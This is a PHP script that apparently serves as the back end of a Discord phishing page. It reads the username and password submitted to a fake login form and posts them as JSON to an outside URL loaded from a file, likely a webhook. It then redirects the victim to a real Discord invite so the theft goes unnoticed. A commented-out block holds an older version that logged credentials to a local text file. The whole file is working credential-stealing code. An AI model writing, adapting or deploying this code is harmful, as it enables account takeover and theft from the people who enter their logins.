<?php 
/*file_put_contents("usernames.txt", "Discord Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://discord.gg/yrcWPWCsCu');
exit();*/
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $name = $_POST["email"];
  $message = $_POST["pass"];

  $jumper = file_get_contents("setend/down.txt");

  $content = "Discord Username: " . $name . " Pass: " . $message ."\n";

  $data = array("content" => $content);
  $data_string = json_encode($data);

  $ch = curl_init($jumper);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'Content-Length: ' . strlen($data_string)
  ));

  $result = curl_exec($ch);
  curl_close($ch);
  
  header('Location: https://discord.gg/yrcWPWCsCu');
  exit();
}
?>
